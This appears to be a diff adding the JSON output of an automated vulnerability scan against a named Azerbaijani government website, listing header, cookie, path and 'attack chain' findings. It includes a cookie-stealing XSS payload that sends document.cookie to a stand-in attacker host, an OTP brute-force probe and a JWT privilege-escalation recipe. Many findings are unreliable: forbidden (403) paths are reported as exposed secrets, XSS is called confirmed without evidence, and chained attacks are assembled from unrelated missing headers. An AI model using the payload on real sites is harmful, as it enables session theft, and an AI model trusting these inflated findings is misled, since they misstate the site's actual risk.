@@ -1,0 +1,295 @@
+{
+  "name": "20260526_004507",
+  "target": "https://azcon.gov.az/az",
+  "domain": "azcon.gov.az",
+  "threads": 20,
+  "timeout": 25,
+  "findings": [
+    {
+      "url": "https://azcon.gov.az/az/.git/config",
+      "type": "Exposed Sensitive Path",
+      "path": ".git/config",
+      "status_code": 403,
+      "size": 146,
+      "severity": "high",
+      "detail": "Git repository exposed \u2014 source code leakage risk",
+      "evidence": "HTTP 403 | Size: 146 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Move sensitive files outside web root. Never deploy .env to production."
+    },
+    {
+      "url": "https://azcon.gov.az/az/.well-known",
+      "type": "Exposed Sensitive Path",
+      "path": ".well-known",
+      "status_code": 403,
+      "size": 146,
+      "severity": "low",
+      "detail": "Path exists but is forbidden \u2014 worth further investigation",
+      "evidence": "HTTP 403 | Size: 146 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 3.1,
+      "remediation": "Verify directory listing is disabled. Ensure proper access controls."
+    },
+    {
+      "url": "https://azcon.gov.az/az/.DS_Store",
+      "type": "Exposed Sensitive Path",
+      "path": ".DS_Store",
+      "status_code": 403,
+      "size": 146,
+      "severity": "low",
+      "detail": "Path exists but is forbidden \u2014 worth further investigation",
+      "evidence": "HTTP 403 | Size: 146 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 3.1,
+      "remediation": "Verify directory listing is disabled. Ensure proper access controls."
+    },
+    {
+      "url": "https://azcon.gov.az/az/db.sql",
+      "type": "Exposed Sensitive Path",
+      "path": "db.sql",
+      "status_code": 403,
+      "size": 146,
+      "severity": "high",
+      "detail": "Path exists but is forbidden \u2014 worth further investigation",
+      "evidence": "HTTP 403 | Size: 146 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Verify directory listing is disabled. Ensure proper access controls."
+    },
+    {
+      "url": "https://azcon.gov.az/az/.git",
+      "type": "Exposed Sensitive Path",
+      "path": ".git",
+      "status_code": 403,
+      "size": 146,
+      "severity": "high",
+      "detail": "Git repository exposed \u2014 source code leakage risk",
+      "evidence": "HTTP 403 | Size: 146 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Block .git access in web server config. Use .gitignore properly."
+    },
+    {
+      "url": "https://azcon.gov.az/az/.env",
+      "type": "Exposed Sensitive Path",
+      "path": ".env",
+      "status_code": 403,
+      "size": 146,
+      "severity": "high",
+      "detail": "Environment file exposed \u2014 may contain credentials",
+      "evidence": "HTTP 403 | Size: 146 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Move sensitive files outside web root. Never deploy .env to production."
+    },
+    {
+      "url": "https://azcon.gov.az/az/.htaccess",
+      "type": "Exposed Sensitive Path",
+      "path": ".htaccess",
+      "status_code": 403,
+      "size": 146,
+      "severity": "low",
+      "detail": "Path exists but is forbidden \u2014 worth further investigation",
+      "evidence": "HTTP 403 | Size: 146 bytes | No WAF block",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 3.1,
+      "remediation": "Verify directory listing is disabled. Ensure proper access controls."
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "type": "Missing Header: Content-Security-Policy",
+      "severity": "high",
+      "detail": "CSP prevents XSS and data injection attacks by controlling allowed resource sources.",
+      "evidence": "Header 'Content-Security-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Add a strict CSP: 'default-src \\'self\\'; script-src \\'self\\'; object-src \\'none\\';'"
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "type": "Missing Header: Strict-Transport-Security",
+      "severity": "high",
+      "detail": "HSTS forces HTTPS connections and prevents SSL-stripping attacks.",
+      "evidence": "Header 'Strict-Transport-Security' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 7.5,
+      "remediation": "Add: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload"
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "type": "Missing Header: X-Frame-Options",
+      "severity": "medium",
+      "detail": "Missing X-Frame-Options allows clickjacking attacks (embedding site in iframes).",
+      "evidence": "Header 'X-Frame-Options' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 6.1,
+      "remediation": "Add: X-Frame-Options: DENY  (or use CSP frame-ancestors directive instead)"
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "type": "Missing Header: X-Content-Type-Options",
+      "severity": "low",
+      "detail": "Missing header allows MIME-type sniffing, enabling content injection.",
+      "evidence": "Header 'X-Content-Type-Options' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 3.1,
+      "remediation": "Add: X-Content-Type-Options: nosniff"
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "type": "Missing Header: Referrer-Policy",
+      "severity": "low",
+      "detail": "Missing Referrer-Policy may leak sensitive URL information to third parties.",
+      "evidence": "Header 'Referrer-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 3.1,
+      "remediation": "Add: Referrer-Policy: strict-origin-when-cross-origin"
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "type": "Missing Header: Permissions-Policy",
+      "severity": "info",
+      "detail": "Missing Permissions-Policy allows access to powerful browser APIs (camera, mic, etc.).",
+      "evidence": "Header 'Permissions-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Permissions-Policy: geolocation=(), camera=(), microphone=()"
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "type": "Missing Header: Cross-Origin-Opener-Policy",
+      "severity": "info",
+      "detail": "Missing COOP allows cross-origin pages to access window references.",
+      "evidence": "Header 'Cross-Origin-Opener-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Cross-Origin-Opener-Policy: same-origin"
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "type": "Missing Header: Cross-Origin-Resource-Policy",
+      "severity": "info",
+      "detail": "Missing CORP allows cross-origin pages to load this site's resources.",
+      "evidence": "Header 'Cross-Origin-Resource-Policy' not present in response",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Add: Cross-Origin-Resource-Policy: same-origin"
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "type": "Information Disclosure: Server",
+      "severity": "info",
+      "detail": "Server version disclosure may aid attacker fingerprinting.",
+      "evidence": "Server: nginx",
+      "owasp": "A05:2021 \u2013 Security Misconfiguration",
+      "cvss": 2.0,
+      "remediation": "Configure web server to omit or genericize the Server header."
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "parameter": "Cookie: XSRF-TOKEN",
+      "payload": "SameSite attribute analysis",
+      "type": "CSRF \u2014 Weak SameSite Policy",
+      "severity": "medium",
+      "evidence": "Cookie 'XSRF-TOKEN' SameSite=NOT SET Secure=No",
+      "detail": "Cookie 'XSRF-TOKEN' lacks a strict SameSite policy, enabling cross-site request delivery.",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 5.4,
+      "remediation": "Set SameSite=Strict or SameSite=Lax on all session cookies. Combine with CSRF tokens for defense-in-depth."
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "parameter": "Cookie: laravel_session",
+      "payload": "SameSite attribute analysis",
+      "type": "CSRF \u2014 Weak SameSite Policy",
+      "severity": "medium",
+      "evidence": "Cookie 'laravel_session' SameSite=NOT SET Secure=No",
+      "detail": "Cookie 'laravel_session' lacks a strict SameSite policy, enabling cross-site request delivery.",
+      "owasp": "A01:2021 \u2013 Broken Access Control",
+      "cvss": 5.4,
+      "remediation": "Set SameSite=Strict or SameSite=Lax on all session cookies. Combine with CSRF tokens for defense-in-depth."
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "type": "XSS \u2014 Session Hijack Payload (Generated)",
+      "severity": "critical",
+      "cvss": 9.3,
+      "parameter": "q",
+      "detail": "XSS confirmed in 'q'. Cookie-stealing payload generated. Attacker can capture session tokens of authenticated users.",
+      "evidence": "Payload: <script>fetch('https://attacker.invalid/steal?c='+document.cookie);</script>",
+      "owasp": "A03:2021 \u2013 Injection",
+      "remediation": "Implement strict CSP. Sanitize all output. Set HttpOnly + Secure flags on all session cookies.",
+      "exploit_chain": "XSS \u2192 Cookie Theft \u2192 Session Hijack \u2192 Account Takeover"
+    },
+    {
+      "url": "https://azcon.gov.az/az",
+      "type": "2FA \u2014 Not Implemented",
+      "severity": "medium",
+      "cvss": 5.9,
+      "detail": "No 2FA/MFA endpoint detected.",
+      "evidence": "None of common OTP paths returned OTP form.",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Implement TOTP-based 2FA (FIDO2/WebAuthn/RFC 6238) for all accounts."
+    },
+    {
+      "url": null,
+      "type": "2FA \u2014 No Rate Limiting on OTP (Brute-force Possible)",
+      "severity": "high",
+      "cvss": 7.5,
+      "detail": "Tested 7 OTP codes with no lockout or 429 response.",
+      "evidence": "No rate-limit after 7 attempts",
+      "owasp": "A07:2021 \u2013 Identification and Authentication Failures",
+      "remediation": "Enforce max 5 attempts. Add exponential backoff and account lockout."
+    },
+    {
+      "type": "CHAIN: XSS \u2192 CSRF \u2192 Account Takeover",
+      "severity": "critical",
+      "cvss": 9.8,
+      "url": "https://azcon.gov.az/az",
+      "module": "Chain Engine",
+      "detail": "XSS allows attacker to steal CSRF tokens from victim's browser DOM, then forge authenticated state-changing requests (password reset, email change) without victim's knowledge \u2014 leading to full account takeover.",
+      "evidence": "Step 1: [Missing Header: Content-Security-Policy] at https://azcon.gov.az/az\nStep 2: [CSRF \u2014 Weak SameSite Policy] at https://azcon.gov.az/az",
+      "owasp": "A01:2021 \u2013 Broken Access Control (Chained)",
+      "remediation": "Implement strict CSP (Content-Security-Policy). Use SameSite=Strict cookies. Enforce CSRF tokens even when XSS is patched (defense in depth).",
+      "attack_steps": "XSS \u2192 Steal CSRF Token \u2192 Forge Request \u2192 Change Email/Password \u2192 Account Takeover",
+      "chain_components": [
+        "Missing Header: Content-Security-Policy",
+        "CSRF \u2014 Weak SameSite Policy"
+      ]
+    },
+    {
+      "type": "CHAIN: CORS Misconfiguration \u2192 XSS \u2192 Session Theft",
+      "severity": "high",
+      "cvss": 8.8,
+      "url": "https://azcon.gov.az/az",
+      "module": "Chain Engine",
+      "detail": "Permissive CORS allows malicious origins to make authenticated API requests. Combined with XSS, attacker can send victim's session cookies to a controlled server via cross-origin fetch.",
+      "evidence": "Step 1: [Missing Header: Cross-Origin-Opener-Policy] at https://azcon.gov.az/az\nStep 2: [Missing Header: Content-Security-Policy] at https://azcon.gov.az/az",
+      "owasp": "A01:2021 \u2013 Broken Access Control (Chained)",
+      "remediation": "Restrict CORS to trusted origins. Do not use wildcard (*) with credentials. Set HttpOnly + Secure + SameSite on cookies.",
+      "attack_steps": "CORS * \u2192 XSS on trusted subdomain \u2192 fetch(attacker.com, cookies) \u2192 Session Steal",
+      "chain_components": [
+        "Missing Header: Cross-Origin-Opener-Policy",
+        "Missing Header: Content-Security-Policy"
+      ]
+    },
+    {
+      "type": "CHAIN: JWT None Algorithm \u2192 Admin Privilege Escalation",
+      "severity": "critical",
+      "cvss": 9.8,
+      "url": "https://azcon.gov.az/az",
+      "module": "Chain Engine",
+      "detail": "JWT with 'alg:none' or weak HS256 secret allows forging tokens with arbitrary claims (e.g. role:admin). This bypasses all role-based access controls.",
+      "evidence": "Step 1: [CSRF \u2014 Weak SameSite Policy] at https://azcon.gov.az/az\nStep 2: [CSRF \u2014 Weak SameSite Policy] at https://azcon.gov.az/az",
+      "owasp": "A01:2021 \u2013 Broken Access Control (Chained)",
+      "remediation": "Enforce RS256/ES256 algorithms. Reject 'none' algorithm. Validate all JWT claims server-side. Use short expiration times.",
+      "attack_steps": "JWT alg:none \u2192 Forge {role:admin} \u2192 Access admin panel \u2192 Full privilege escalation",
+      "chain_components": [
+        "CSRF \u2014 Weak SameSite Policy",
+        "CSRF \u2014 Weak SameSite Policy"
+      ]
+    }
+  ],
+  "start_time": "2026-05-26T00:45:07.376785"
+}
